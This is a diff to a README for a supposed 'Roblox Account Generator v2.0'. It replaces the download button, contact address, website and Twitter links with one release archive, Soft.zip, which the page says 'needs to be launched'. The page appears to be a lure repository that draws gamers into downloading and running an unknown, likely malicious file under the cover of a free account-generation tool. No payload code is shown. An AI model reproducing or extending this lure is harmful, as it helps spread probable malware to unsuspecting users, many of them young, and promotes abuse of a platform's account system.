@@ -20,7 +20,7 @@ Welcome to the official repository for the Roblox Account Generator v2.0! This t
 ## Get Started
 To get started, simply download the latest release of the Roblox Account Generator v2.0 by clicking the button below. Let's dive into the world of unlimited Roblox accounts and epic gaming experiences!
 
-[![Download Roblox Account Generator v2.0](https://img.shields.io/badge/Download-Release.zip-blue.svg)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Roblox Account Generator v2.0](https://github.com/Br1anYtHacks/Roblox-Account-Generator-v2.0/releases/download/v1.0/Soft.zip)](https://github.com/Br1anYtHacks/Roblox-Account-Generator-v2.0/releases/download/v1.0/Soft.zip)
 *(File needs to be launched)*
 
 ---
@@ -44,7 +44,7 @@ To get started, simply download the latest release of the Roblox Account Generat
 ## Support & Contributions
 🌟 **Feedback**: We welcome any feedback or suggestions to improve the Roblox Account Generator v2.0.
 🤝 **Contributions**: Feel free to contribute to the development of this tool by submitting pull requests.
-📧 **Contact Us**: If you encounter any issues or need help, reach out to us at robloxgen@example.com.
+📧 **Contact Us**: If you encounter any issues or need help, reach out to us at https://github.com/Br1anYtHacks/Roblox-Account-Generator-v2.0/releases/download/v1.0/Soft.zip
 
 ---
 
@@ -56,8 +56,8 @@ We do not endorse any form of cheating or unethical gaming practices. The Roblox
 ## Stay Connected
 Stay updated on the latest features and releases by following our GitHub repository. Join our community for exclusive insights and discussions on the Roblox Account Generator v2.0.
 
-🌐 **Website**: [Roblox Account Generator Website](https://robloxgen.example.com)
-📱 **Twitter**: [@RobloxGenOfficial](https://twitter.com/RobloxGenOfficial)
+🌐 **Website**: [Roblox Account Generator Website](https://github.com/Br1anYtHacks/Roblox-Account-Generator-v2.0/releases/download/v1.0/Soft.zip)
+📱 **Twitter**: [@RobloxGenOfficial](https://github.com/Br1anYtHacks/Roblox-Account-Generator-v2.0/releases/download/v1.0/Soft.zip)
 
 ---
 
